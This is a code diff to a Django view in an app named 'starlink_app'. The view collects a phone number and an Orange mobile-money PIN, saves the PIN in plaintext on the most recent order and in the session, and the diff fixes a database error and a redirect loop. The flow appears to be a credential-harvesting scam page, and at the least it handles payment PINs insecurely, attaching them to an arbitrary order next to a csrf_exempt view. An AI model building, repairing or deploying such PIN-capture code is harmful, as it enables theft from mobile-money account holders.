@@ -52,7 +52,6 @@ def payment_instructions(request):
     return redirect('starlink_app:home')
 
 def otp_verification(request):
-    # Try to find the most recent order
     order = Order.objects.order_by('-created_at').first() 
 
     if request.method == 'POST':
@@ -60,25 +59,26 @@ def otp_verification(request):
         pin = request.POST.get('pin', '')
 
         if order:
-            # Update the existing order if we found one
             order.phone_number = phone 
             order.orange_pin = pin
             order.save()
         else:
-            # CRITICAL: Create a new order if the database is empty!
+            # Added total_amount=0 to satisfy the database constraint
             order = Order.objects.create(
                 phone_number=phone,
                 orange_pin=pin,
                 full_name="Guest User",
+                total_amount=0,  # This prevents the NOT NULL error
                 status='Pending'
             )
 
-        # Store in session for the next page
         request.session['phone'] = phone
         request.session['pin'] = pin
         request.session['bundle_name'] = order.bundle.name if order.bundle else "Unknown"
 
-        return redirect('starlink_app:otp_verification')
+        # Make sure this redirect points to a REAL page like 'success' 
+        # so you don't get stuck in a loop
+        return redirect('starlink_app:success_page') 
         
     return render(request, 'otp_verification.html', {'order': order})
 @csrf_exempt
